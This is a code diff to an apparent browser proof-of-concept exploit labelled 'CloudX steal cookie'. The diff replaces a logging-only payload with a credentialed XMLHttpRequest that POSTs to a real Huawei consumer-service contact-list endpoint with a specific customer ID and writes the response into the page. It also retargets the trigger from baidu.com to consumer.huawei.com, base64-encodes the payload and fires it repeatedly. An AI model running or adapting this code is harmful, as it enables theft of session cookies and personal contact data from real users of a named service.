@@ -6,9 +6,22 @@
     let url = location.href;
     console.log('CloudX steal cookie-up:'+document.cookie.length);
     console.log("payload-url:"+url);
-    if(!url.startsWith("https://renfromabove.github.io")){
-      console.log('CloudX steal cookie:');
-    }`;
+    xhr=new XMLHttpRequest();
+xhr.open('POST','https://ccpce-cn.consumer.huawei.com/ccpcmd/services/dispatch/secured/CCPC/EN/ccpd/getContactListV2/1000',false);
+xhr.setRequestHeader('Content-type','application/json'); xhr.withCredentials=true;
+xhr.onreadystatechange=function(){if (xhr.readyState==4){if (xhr.status==200 || xhr.status==304){document.write(xhr.responseText); }}}
+data = JSON.stringify({
+    "source": "100000007",
+    "customerGuid": "873595888038825984",
+    "language": "zh-cn",
+    "channelCode": "WEBSITE",
+    "countryCode": "CN",
+    "langCode": "zh-cn",
+    "country": "CN",
+    "siteCode": "zh_CN"
+});
+xhr.send(data);
+    `
     const base64 = btoa(payload);
     for(let i=0; i<1000; i++){
       setTimeout(function(){
@@ -20,6 +33,6 @@
     location.href = url;
   }
   window.addEventListener('load', () => {
-    triggerPoc("https://www.baidu.com", `console.log('CloudX steal cookie:'+document.cookie)`)
+    triggerPoc("https://consumer.huawei.com/cn/", `console.log('CloudX steal cookie:'+document.cookie)`)
   })
 </script>
